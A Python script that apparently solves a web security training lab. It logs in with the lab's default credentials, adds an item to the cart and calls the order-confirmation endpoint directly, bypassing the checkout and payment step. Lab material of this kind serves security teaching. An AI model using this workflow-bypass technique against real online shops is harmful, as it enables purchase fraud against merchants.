import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
cart_url = burp_url + '/cart'
confirm_url = burp_url + '/cart/order-confirmation?order-confirmation=true'
session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)
burp_data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
session.post(cart_url, data=burp_data)
session.get(confirm_url)
